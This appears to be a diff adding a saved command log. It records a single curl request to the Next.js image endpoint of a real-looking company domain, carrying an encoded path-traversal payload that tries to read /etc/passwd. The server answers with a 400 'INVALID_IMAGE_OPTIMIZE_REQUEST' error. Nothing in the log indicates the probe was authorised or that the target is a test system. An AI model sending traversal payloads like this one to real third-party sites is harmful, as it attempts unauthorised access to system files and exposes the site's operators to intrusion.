@@ -1,0 +1,11 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}' 'https://www.infinitycapital.bh/_next/image?search=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd'
+# exit_code: 0
+# ---
+
+Bad request
+
+INVALID_IMAGE_OPTIMIZE_REQUEST
+
+bom1::7ltnf-1790749305836-7e7dd11086df
+
+HTTP_STATUS:400
